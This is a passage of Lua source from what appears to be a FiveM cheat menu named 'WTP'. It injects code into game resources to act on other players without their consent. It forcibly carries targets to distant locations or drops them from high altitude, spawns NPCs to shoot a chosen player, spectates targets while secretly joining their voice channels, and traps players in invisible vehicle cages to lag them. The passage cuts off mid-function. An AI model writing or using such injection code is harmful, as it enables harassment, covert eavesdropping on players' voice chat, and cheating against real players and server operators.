                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)

                                            WTP.SafeRunNative(Wait, 300)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the player into Maze Bank.", 3000)
                                elseif value == "Death" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode("any", string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = -75.28, -818.84, 326.17

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y,  2500.0, false, false, false)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)

                                            WTP.SafeRunNative(Wait, 300)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the player into Death.", 3000)
                                elseif value == "Agency Bunker" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode("any", string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = -1111.999, -76.620, -91.379

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)

                                            WTP.SafeRunNative(Wait, 300)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the player into Agency Bunker.", 3000)
                                elseif value == "Record A Bunker" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode("any", string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = -1010.791, -64.487, -100.403

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)

                                            WTP.SafeRunNative(Wait, 300)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the player into Record A Bunker.", 3000)
                                elseif value == "Meth Bunker" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode("any", string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = 1009.630, -3197.849, -38.996

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)

                                            WTP.SafeRunNative(Wait, 300)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the player into Meth Bunker.", 3000)
                                elseif value == "After Hours Bunker" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode("any", string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = -1604.664, -3012.583, -78.000

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)

                                            WTP.SafeRunNative(Wait, 300)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the player into After Hours Bunker.", 3000)
                                elseif value == "Tunnel Bunker" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode("any", string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)
                                            local destX, destY, destZ = 1256.11, 4796.48, -39.05

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, destX, destY, destZ, false, false, false)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)

                                            WTP.SafeRunNative(Wait, 300)

                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)

                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the player into Tunnel Bunker.", 3000)
                                elseif value == "Waypoint" then
                                    if not IsWaypointActive() then
                                        self:Notify("error", "WTP", "You must set a waypoint on the map first!", 3000)
                                        return
                                    end

                                    local waypointBlip = GetFirstBlipInfoId(8)
                                    local waypointCoords = GetBlipInfoIdCoord(waypointBlip)

                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetSafeRes, string.format([[
                                            local myPed = PlayerPedId()
                                            local sid = %d
                                            local player = GetPlayerFromServerId(sid)
                                            local targetPed = GetPlayerPed(player)

                                            if DoesEntityExist(targetPed) then
                                                local originalCoords = GetEntityCoords(myPed)
                                                local destX, destY = %f, %f
                                                local targetCoords = GetEntityCoords(targetPed)
                                                local foundGround, groundZ = GetGroundZFor_3dCoord(destX, destY, 800.0, 0)
                                                if not foundGround then groundZ = 0.0 end

                                                WTP.SafeRunNative(ClearPedTasksImmediately, myPed)
                                                WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                                WTP.SafeRunNative(SetEntityCollision, myPed, false, false)
                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false)
                                                WTP.SafeRunNative(Wait, 250)
                                                WTP.SafeRunNative(ExecuteCommand, "carry")
                                                WTP.SafeRunNative(Wait, 250)
                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, destX, destY, groundZ + 2.0, false, false, false)
                                                WTP.SafeRunNative(Wait, 250)
                                                WTP.SafeRunNative(ExecuteCommand, "carry")
                                                WTP.SafeRunNative(Wait, 250)
                                                WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                                WTP.SafeRunNative(SetEntityCollision, myPed, true, true)
                                                WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            end
                                        ]], playerId, waypointCoords.x, waypointCoords.y))
                                    end
                                    self:Notify("success", "WTP", "Sent players to your Waypoint!", 3000)
                                elseif value == "Bring Target" then
                                    for _, playerId in ipairs(targetPlayers) do
                                        executeCode(targetSafeRes, string.format([[
                                            local targetId = %d
                                            local cmd = "carry"
                                            local myPed = PlayerPedId()
                                            local originalCoords = GetEntityCoords(myPed)

                                            local targetIdx = GetPlayerFromServerId(targetId)
                                            if targetIdx == -1 then return end
                                            local targetPed = GetPlayerPed(targetIdx)

                                            if not WTP.SafeRunNative(DoesEntityExist, targetPed) then return end

                                            WTP.SafeRunNative(SetEntityVisible, myPed, false, false)
                                            WTP.SafeRunNative(SetEntityAlpha, myPed, 0, false)

                                            local currentPos = GetEntityCoords(targetPed)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, currentPos.x, currentPos.y, currentPos.z - 1.3, false, false, false)
                                            WTP.SafeRunNative(Wait, 50)

                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(Wait, 100)

                                            WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                            local timeout = 0
                                            while not WTP.SafeRunNative(NetworkHasControlOfEntity, targetPed) and timeout < 30 do
                                                WTP.SafeRunNative(NetworkRequestControlOfEntity, targetPed)
                                                WTP.SafeRunNative(Wait, 10)
                                                timeout = timeout + 1
                                            end

                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, true)
                                            WTP.SafeRunNative(Wait, 300)
                                            WTP.SafeRunNative(SetEntityCoordsNoOffset, myPed, originalCoords.x, originalCoords.y, originalCoords.z, false, false, false)
                                            WTP.SafeRunNative(SetEntityVisible, myPed, true, false)
                                            WTP.SafeRunNative(ResetEntityAlpha, myPed)
                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(ExecuteCommand, cmd)
                                            WTP.SafeRunNative(DetachEntity, targetPed, true, true)
                                            WTP.SafeRunNative(DetachEntity, myPed, true, true)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, targetPed)
                                            WTP.SafeRunNative(ClearPedTasksImmediately, myPed)
                                            WTP.SafeRunNative(Wait, 200)
                                            WTP.SafeRunNative(FreezeEntityPosition, targetPed, false)
                                        ]], playerId))
                                    end
                                    self:Notify("success", "WTP", "Successfully bring the target to you.", 3000)
                                end
                            end
                        },
                        { type = "scrollable", label = "Kill Player NPC", scrollType = "onEnter", value = 1, values = {"Pistol", "Pistol.50", "Sniper Rifle"},
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, isSelected in pairs(CPlayers) do
                                    if isSelected then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local weaponMap = {
                                    ["Pistol"] = "weapon_pistol",
                                    ["Pistol.50"] = "weapon_pistol50",
                                    ["Sniper Rifle"] = "weapon_sniperrifle"
                                }
                                local weaponHash = weaponMap[value]
                                local targetID = tonumber(targetPlayers[1])
                                MachoInjectResource(targetSafeRes, ([[
                                    local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                    local npcModel = "mp_m_freemode_01"
                                    local theWeapon = "%s"
                                    local coords = GetEntityCoords(targetPed)

                                    RequestModel(npcModel)
                                    while not HasModelLoaded(npcModel) do
                                        Wait(0)
                                    end

                                    local npcPed = CreatePed(4, GetHashKey(npcModel), coords.x + 10, coords.y, coords.z, 0.0, true, true)

                                    if DoesEntityExist(npcPed) then
                                        SetPedCanRagdoll(npcPed, false)
                                        FreezeEntityPosition(npcPed, true)
                                        GiveWeaponToPed(npcPed, GetHashKey(theWeapon), 250, false, true)
                                        SetWeaponDamageModifier(GetHashKey(theWeapon), 1000.0)
                                        SetPedCombatAttributes(npcPed, 5, true)
                                        SetPedCombatRange(npcPed, 2)
                                        SetPedCombatMovement(npcPed, 3)
                                        TaskCombatPed(npcPed, playerPed, 0, 16)
                                        local headBone = GetPedBoneIndex(targetPed, 31086)
                                        local targetCoords = GetPedBoneCoords(targetPed, headBone, 0.0, 0.0, 0.0)
                                        TaskShootAtCoord(npcPed, targetCoords.x, targetCoords.y, targetCoords.z, 1000, GetHashKey("FIRING_PATTERN_SINGLE_SHOT"))
                                        Wait(1000)
                                        DeleteEntity(npcPed)
                                    end

                                    SetModelAsNoLongerNeeded(GetHashKey(npcModel))
                                ]]):format(targetID, weaponHash))
                                self:Notify("success", "WTP", "Successfully Kill Player NPC", 3000)
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        { type = "checkbox", label = "Spectate Player", checked = false, desc = 'This will attempt to Spectate the player',
                            onSelect = function(checked)
                                local targetPlayers = {}
                                for serverId, isSelected in pairs(CPlayers) do
                                    if isSelected then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end
                                local targetID = tonumber(targetPlayers[1])
                                if checked then
                                    executeCode('any', string.format([[
                                        _G.__SpectateRunning = true
                                        local tgtPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                        local cam = WTP.SafeRunNative(CreateCam, "DEFAULT_SCRIPTED_CAMERA", true)
                                        _G.__SpectateCam = cam
                                        WTP.SafeRunNative(SetCamActive, cam, true)
                                        WTP.SafeRunNative(RenderScriptCams, true, false, 0, true, false)
                                        local function enableSpectateVoice()
                                            local players = GetActivePlayers()
                                            for i = 1, #players do
                                                local ply = players[i]
                                                local sid = GetPlayerServerId(ply)
                                                if sid ~= GetPlayerServerId(PlayerId()) then
                                                    local ch = MumbleGetVoiceChannelFromServerId(sid)
                                                    if ch ~= -1 then
                                                        MumbleAddVoiceChannelListen(ch)
                                                    end
                                                end
                                            end
                                        end

                                        enableSpectateVoice()

                                        WTP.SafeRunNative(CreateThread, function()
                                            local distanceBehind = 3.0
                                            local baseHeight = 1.0

                                            while _G.__SpectateRunning and tgtPed and DoesEntityExist(tgtPed) do
                                                Wait(1)
                                                local coords = GetEntityCoords(tgtPed)
                                                WTP.SafeRunNative(RequestAdditionalCollisionAtCoord, coords.x, coords.y, coords.z)
                                                WTP.SafeRunNative(SetFocusPosAndVel, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)
                                                local camRot = WTP.SafeRunNative(GetGameplayCamRot, 0)
                                                local pitch = -math.rad(camRot.x)
                                                local heading = math.rad(camRot.z)

                                                local offsetX = -math.sin(heading) * math.cos(pitch) * distanceBehind
                                                local offsetY =  math.cos(heading) * math.cos(pitch) * distanceBehind
                                                local offsetZ =  math.sin(pitch) * distanceBehind

                                                local camX = coords.x + offsetX
                                                local camY = coords.y + offsetY
                                                local camZ = coords.z + baseHeight + offsetZ

                                                WTP.SafeRunNative(SetCamCoord, cam, camX, camY, camZ)
                                                WTP.SafeRunNative(PointCamAtEntity, cam, tgtPed, 0.0, 0.0, 0.8, true)

                                                tgtPed = GetPlayerPed(GetPlayerFromServerId(%d))
                                            end

                                            ClearFocus()
                                            WTP.SafeRunNative(RenderScriptCams, false, false, 0, true, false)
                                            WTP.SafeRunNative(DestroyCam, cam, false)
                                            _G.__SpectateCam = nil
                                        end)
                                    ]], targetID, targetID))
                                else
                                    executeCode('any', [[
                                        _G.__SpectateRunning = false
                                        if _G.__SpectateCam then
                                            ClearFocus()
                                            WTP.SafeRunNative(RenderScriptCams, false, false, 0, true, false)
                                            WTP.SafeRunNative(DestroyCam, _G.__SpectateCam, false)
                                            _G.__SpectateCam = nil
                                        end

                                        local players = GetActivePlayers()
                                        for i = 1, #players do
                                            local ply = players[i]
                                            local sid = GetPlayerServerId(ply)
                                            if sid ~= GetPlayerServerId(PlayerId()) then
                                                local ch = MumbleGetVoiceChannelFromServerId(sid)
                                                if ch ~= -1 then
                                                    MumbleRemoveVoiceChannelListen(ch)
                                                end
                                            end
                                        end
                                    ]])
                                end
                            end
                        },
                        { type = "checkbox", label = "Bug Player", desc = "This will attemp to lag the player", checked = false,
                            onSelect = function(checked)
                                local targetPlayers = {}
                                for serverId, checkeds in pairs(CPlayers) do
                                    if checkeds then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetServerId = targetPlayers[1]
                                if checked then
                                    MachoInjectResource(targetSafeRes, string.format([[
                                        _G.cageObjs = {}
                                        _G.cageFollow = true

                                        local targetPlayer = GetPlayerFromServerId(%d)
                                        if not targetPlayer or targetPlayer == -1 then return end

                                        local targetPed = GetPlayerPed(targetPlayer)
                                        if not DoesEntityExist(targetPed) then return end

                                        local model = joaat("adder")

                                        RequestModel(model)
                                        while not HasModelLoaded(model) do Wait(0) end

                                        local offsets = {
                                            vector3( 1.6,  0.0, 0.0),
                                            vector3(-1.6,  0.0, 0.0),
                                            vector3( 0.0,  1.6, 0.0),
                                            vector3( 0.0, -1.6, 0.0),
                                            vector3( 1.1,  1.1, 0.0),
                                            vector3(-1.1,  1.1, 0.0),
                                            vector3( 1.1, -1.1, 0.0),
                                            vector3(-1.1, -1.1, 0.0),
                                        }

                                        for _, off in ipairs(offsets) do
                                            local obj = CreateObject(
                                                model,
                                                0.0, 0.0, 0.0,
                                                true, true, false
                                            )

                                            NetworkRequestControlOfEntity(obj)
                                            local t = GetGameTimer() + 2000
                                            while not NetworkHasControlOfEntity(obj) and GetGameTimer() < t do
                                                Wait(0)
                                            end

                                            local netId = NetworkGetNetworkIdFromEntity(obj)
                                            SetNetworkIdExistsOnAllMachines(netId, true)
                                            SetNetworkIdCanMigrate(netId, false)

                                            SetEntityCollision(obj, true, true)
                                            SetEntityAlpha(obj, 0, false)
                                            SetEntityVisible(obj, false, false)
                                            SetEntityInvincible(obj, true)
                                            FreezeEntityPosition(obj, true)

                                            table.insert(_G.cageObjs, { entity = obj, offset = off })
                                        end

                                        CreateThread(function()
                                            while _G.cageFollow do
                                                if not DoesEntityExist(targetPed) then break end

                                                local baseCoords = GetEntityCoords(targetPed)
                                                local heading = GetEntityHeading(targetPed)

                                                for _, data in ipairs(_G.cageObjs) do
                                                    if DoesEntityExist(data.entity) then
                                                        local world = GetOffsetFromEntityInWorldCoords(
                                                            targetPed,
                                                            data.offset.x,
                                                            data.offset.y,
                                                            -1.0
                                                        )
                                                        SetEntityCoordsNoOffset(
                                                            data.entity,
                                                            world.x,
                                                            world.y,
                                                            world.z,
                                                            false, false, false
                                                        )
                                                        SetEntityHeading(data.entity, heading)
                                                    end
                                                end

                                                Wait(0)
                                            end
                                        end)

                                        SetModelAsNoLongerNeeded(model)
                                    ]], targetServerId))
                                else
                                    MachoInjectResource(targetSafeRes, [[
                                        _G.cageFollow = false
                                        if not _G.cageObjs then return end

                                        for _, data in ipairs(_G.cageObjs) do
                                            if DoesEntityExist(data.entity) then
                                                NetworkRequestControlOfEntity(data.entity)
                                                local t = GetGameTimer() + 2000
                                                while not NetworkHasControlOfEntity(data.entity) and GetGameTimer() < t do
                                                    Wait(0)
                                                end
                                                DeleteEntity(data.entity)
                                            end
                                        end

                                        _G.cageObjs = nil
                                    ]])
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Bug Player V2",
                            desc = "Bug target extreme camera lag and movement lock.",
                            checked = false,
                            onSelect = function(checked)
                                local targetPlayers = {}
                                for serverId, checkeds in pairs(CPlayers) do
                                    if checkeds then targetPlayers[#targetPlayers + 1] = serverId end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTP", "You must select a player to do this!", 3000)
                                    return
                                end

                                local targetId = targetPlayers[1]
                                if checked then
                                    MachoInjectResource(targetSafeRes, string.format([[
                                        _G.TitanBugActive = true
                                        _G.TitanObjs = {}

                                        local targetServerId = %d
                                        local propModel = joaat("adder")

                                        RequestModel(propModel)
                                        while not HasModelLoaded(propModel) do Wait(0) end

                                        local pId = GetPlayerFromServerId(targetServerId)
                                        local targetPed = GetPlayerPed(pId)

                                        local positions = {
                                            vector3(1.2, 0, 0), vector3(-1.2, 0, 0),
                                            vector3(0, 1.2, 0), vector3(0, -1.2, 0)
                                        }

                                        for _, pos in ipairs(positions) do
                                            local obj = CreateObject(propModel, GetEntityCoords(targetPed), true, true, false)
                                            SetEntityVisible(obj, false, false)
                                            SetEntityAlpha(obj, 0, false)
                                            SetEntityCollision(obj, true, true)
                                            SetActivateObjectPhysicsAsSoonAsItIsUnfrozen(obj, true)
                                            table.insert(_G.TitanObjs, {ent = obj, off = pos})
                                        end

                                        CreateThread(function()
                                            local rotation = 0
                                            while _G.TitanBugActive do
                                                local pIdLoop = GetPlayerFromServerId(targetServerId)
                                                local ped = GetPlayerPed(pIdLoop)
                                                
                                                if not DoesEntityExist(ped) then break end
                                                
                                                rotation = rotation + 45 
